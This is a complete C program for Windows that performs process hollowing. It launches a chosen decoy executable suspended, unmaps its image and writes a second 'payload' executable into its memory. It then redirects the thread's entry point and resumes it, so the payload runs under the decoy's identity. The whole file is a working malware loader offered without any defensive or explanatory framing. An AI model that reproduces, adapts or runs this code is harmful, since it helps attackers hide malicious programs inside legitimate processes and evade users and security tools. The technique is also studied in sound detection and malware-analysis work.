#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

typedef NTSTATUS (NTAPI *PFN_NtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtUnmapViewOfSection)(HANDLE, PVOID);

typedef struct _PROCESS_BASIC_INFORMATION_LITE {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION_LITE;

static BOOL ReadFileToBuffer(const char *path, PBYTE *buffer, DWORD *size)
{
    HANDLE file;
    DWORD fileSize;
    DWORD bytesRead = 0;
    PBYTE data;

    file = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        return FALSE;

    fileSize = GetFileSize(file, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(file);
        return FALSE;
    }

    data = (PBYTE)malloc(fileSize);
    if (data == NULL) {
        CloseHandle(file);
        return FALSE;
    }

    if (!ReadFile(file, data, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(data);
        CloseHandle(file);
        return FALSE;
    }

    CloseHandle(file);
    *buffer = data;
    *size = fileSize;
    return TRUE;
}

static BOOL IsPeImage(const PBYTE data, DWORD size)
{
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;

    if (size < sizeof(IMAGE_DOS_HEADER))
        return FALSE;

    dos = (PIMAGE_DOS_HEADER)data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    if (size < (DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS))
        return FALSE;

    nt = (PIMAGE_NT_HEADERS)(data + dos->e_lfanew);
    return nt->Signature == IMAGE_NT_SIGNATURE;
}

int main(int argc, char **argv)
{
    char decoyPath[MAX_PATH];
    PBYTE payloadData = NULL;
    DWORD payloadSize = 0;
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS ntHeaders;
    PIMAGE_SECTION_HEADER sections;
    WORD sectionCount;
    DWORD sizeOfImage;
    DWORD sizeOfHeaders;
    DWORD entryPointRva;
    ULONG pebImageBaseOffset;
    STARTUPINFOA startup = { 0 };
    PROCESS_INFORMATION processInfo = { 0 };
    HMODULE ntdll;
    PFN_NtQueryInformationProcess ntQueryInformationProcess;
    PFN_NtUnmapViewOfSection ntUnmapViewOfSection;
    PROCESS_BASIC_INFORMATION_LITE basicInfo;
    LPVOID originalImageBase = NULL;
    LPVOID remoteImageBase = NULL;
    CONTEXT context;
    BOOL processSuspended = FALSE;
    int exitCode = 1;
    WORD i;

    if (argc != 3) {
        fprintf(stderr, "usage: %s <decoy-executable> <payload-executable>\n", argv[0]);
        return 1;
    }

    if (GetFullPathNameA(argv[1], MAX_PATH, decoyPath, NULL) == 0 ||
        GetFileAttributesA(decoyPath) == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr, "[-] decoy executable not found: %s\n", argv[1]);
        return 1;
    }

    if (!ReadFileToBuffer(argv[2], &payloadData, &payloadSize)) {
        fprintf(stderr, "[-] unable to read payload file: %s\n", argv[2]);
        return 1;
    }

    if (!IsPeImage(payloadData, payloadSize)) {
        fprintf(stderr, "[-] payload is not a valid PE image\n");
        goto cleanup;
    }

    dosHeader = (PIMAGE_DOS_HEADER)payloadData;
    ntHeaders = (PIMAGE_NT_HEADERS)(payloadData + dosHeader->e_lfanew);

    if (ntHeaders->FileHeader.Machine !=
        (WORD)(sizeof(void *) == 8 ? IMAGE_FILE_MACHINE_AMD64 : IMAGE_FILE_MACHINE_I386)) {
        fprintf(stderr, "[-] payload architecture does not match this tool\n");
        goto cleanup;
    }

    if (ntHeaders->OptionalHeader.Magic !=
        (WORD)(sizeof(void *) == 8 ? IMAGE_NT_OPTIONAL_HDR64_MAGIC : IMAGE_NT_OPTIONAL_HDR32_MAGIC)) {
        fprintf(stderr, "[-] payload optional header format mismatch\n");
        goto cleanup;
    }

    sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;
    sizeOfHeaders = ntHeaders->OptionalHeader.SizeOfHeaders;
    entryPointRva = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    sections = IMAGE_FIRST_SECTION(ntHeaders);
    sectionCount = ntHeaders->FileHeader.NumberOfSections;

    startup.cb = sizeof(startup);

    if (!CreateProcessA(decoyPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
                        NULL, NULL, &startup, &processInfo)) {
        fprintf(stderr, "[-] CreateProcess(%s) failed: %lu\n", decoyPath, GetLastError());
        goto cleanup;
    }
    processSuspended = TRUE;

    ntdll = GetModuleHandleA("ntdll.dll");
    ntQueryInformationProcess = (PFN_NtQueryInformationProcess)GetProcAddress(
        ntdll, "NtQueryInformationProcess");
    ntUnmapViewOfSection = (PFN_NtUnmapViewOfSection)GetProcAddress(
        ntdll, "NtUnmapViewOfSection");

    if (ntQueryInformationProcess == NULL || ntUnmapViewOfSection == NULL) {
        fprintf(stderr, "[-] required ntdll exports not found\n");
        goto cleanup;
    }

    ZeroMemory(&basicInfo, sizeof(basicInfo));
    if (ntQueryInformationProcess(processInfo.hProcess, 0, &basicInfo,
                                  sizeof(basicInfo), NULL) < 0 ||
        basicInfo.PebBaseAddress == NULL) {
        fprintf(stderr, "[-] NtQueryInformationProcess failed\n");
        goto cleanup;
    }

    pebImageBaseOffset = (ULONG)(sizeof(void *) == 8 ? 0x10 : 0x08);
    if (!ReadProcessMemory(processInfo.hProcess,
                           (PBYTE)basicInfo.PebBaseAddress + pebImageBaseOffset,
                           &originalImageBase, sizeof(originalImageBase), NULL)) {
        fprintf(stderr, "[-] unable to read the remote PEB image base\n");
        goto cleanup;
    }

    ntUnmapViewOfSection(processInfo.hProcess, originalImageBase);

    remoteImageBase = VirtualAllocEx(processInfo.hProcess, originalImageBase, sizeOfImage,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteImageBase == NULL) {
        remoteImageBase = VirtualAllocEx(processInfo.hProcess, NULL, sizeOfImage,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (remoteImageBase == NULL) {
        fprintf(stderr, "[-] VirtualAllocEx failed: %lu\n", GetLastError());
        goto cleanup;
    }

    if (!WriteProcessMemory(processInfo.hProcess, remoteImageBase,
                            payloadData, sizeOfHeaders, NULL)) {
        fprintf(stderr, "[-] failed to write PE headers: %lu\n", GetLastError());
        goto cleanup;
    }

    for (i = 0; i < sectionCount; i++) {
        if (sections[i].SizeOfRawData == 0)
            continue;

        if (!WriteProcessMemory(processInfo.hProcess,
                                (PBYTE)remoteImageBase + sections[i].VirtualAddress,
                                payloadData + sections[i].PointerToRawData,
                                sections[i].SizeOfRawData, NULL)) {
            fprintf(stderr, "[-] failed to write section %u: %lu\n",
                    (unsigned)i, GetLastError());
            goto cleanup;
        }
    }

    if (remoteImageBase != originalImageBase &&
        !WriteProcessMemory(processInfo.hProcess,
                            (PBYTE)basicInfo.PebBaseAddress + pebImageBaseOffset,
                            &remoteImageBase, sizeof(remoteImageBase), NULL)) {
        fprintf(stderr, "[-] failed to update the remote PEB image base\n");
        goto cleanup;
    }

    ZeroMemory(&context, sizeof(context));
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(processInfo.hThread, &context)) {
        fprintf(stderr, "[-] GetThreadContext failed: %lu\n", GetLastError());
        goto cleanup;
    }

#ifdef _WIN64
    context.Rcx = (DWORD64)((PBYTE)remoteImageBase + entryPointRva);
#else
    context.Eax = (DWORD)((PBYTE)remoteImageBase + entryPointRva);
#endif

    if (!SetThreadContext(processInfo.hThread, &context)) {
        fprintf(stderr, "[-] SetThreadContext failed: %lu\n", GetLastError());
        goto cleanup;
    }

    printf("[+] hollowed pid=%lu imageBase=%p entryPoint=%p\n",
           processInfo.dwProcessId, remoteImageBase,
           (PVOID)((PBYTE)remoteImageBase + entryPointRva));

    if (ResumeThread(processInfo.hThread) == (DWORD)-1) {
        fprintf(stderr, "[-] ResumeThread failed: %lu\n", GetLastError());
        goto cleanup;
    }

    processSuspended = FALSE;
    exitCode = 0;

cleanup:
    if (processInfo.hProcess != NULL) {
        if (processSuspended)
            TerminateProcess(processInfo.hProcess, 1);
        CloseHandle(processInfo.hProcess);
    }
    if (processInfo.hThread != NULL)
        CloseHandle(processInfo.hThread);
    if (payloadData != NULL)
        free(payloadData);

    return exitCode;
}
